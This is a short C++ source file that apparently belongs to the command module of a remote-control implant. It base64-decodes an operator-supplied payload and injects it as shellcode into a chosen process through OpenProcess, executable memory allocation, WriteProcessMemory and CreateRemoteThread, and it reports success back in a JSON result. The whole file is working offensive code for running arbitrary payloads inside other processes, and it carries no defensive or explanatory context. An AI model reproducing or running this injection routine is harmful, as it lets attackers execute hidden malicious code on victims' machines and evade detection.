#include "Command.h"

#include "Stdlib.h"

BOOL InjectShellcode(DWORD Pid, PVOID Payload, DWORD PayloadSize) {
	PVOID 	Memory 			= NULL;
	SIZE_T 	BytesWritten 	= 0;
	HANDLE  ThreadHandle	= NULL;
    HANDLE  ProcessHandle   = NULL;
	
	if (Pid == -1) {
		ProcessHandle = (HANDLE)-1;
	} else {
		// open handle to process
		ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, Pid);
		if (!ProcessHandle) {
			printf("[-] failed to open handle to process (%d): (%d)\n", Pid, GetLastError());
			return FALSE;
		}
	}

	// allocate memory
	Memory = VirtualAllocEx(ProcessHandle, NULL, PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!Memory) {
		printf("[-] failed to allocate memory: ( %d )\n", GetLastError());
		return FALSE;
	}

	// write payload
	if (!WriteProcessMemory(ProcessHandle, Memory, Payload, PayloadSize, &BytesWritten)) {
		printf("[-] failed to write payload: ( %d )\n", GetLastError());
		return FALSE;
	}

	// start the thread
	ThreadHandle = CreateRemoteThread(ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)Memory, NULL, 0, NULL);
	if (ThreadHandle == NULL) {
		printf("[-] failed to create remote thread: ( %d )\n", GetLastError());
		return FALSE;
	}

	CloseHandle(ThreadHandle);

	if (ProcessHandle != (HANDLE)-1)
    	CloseHandle(ProcessHandle);

	return TRUE;
}


BOOL CommandInjectShellcode(json& args, string artifact, json& result) {
    DWORD   PayloadSize     = 0;
    PVOID   Payload         = NULL;
    DWORD   Pid             = args[0].get<DWORD>();

	Payload = Base64Decode(artifact.c_str(), &PayloadSize);
	if (Payload == NULL) {
		return FALSE;
	}

    if (!InjectShellcode(Pid, Payload, PayloadSize)) {
	    result["output"] = "[-] failed to inject process";
		return FALSE;
	}

    result["output"] = "[+] process injected successfuly";
    return TRUE;
}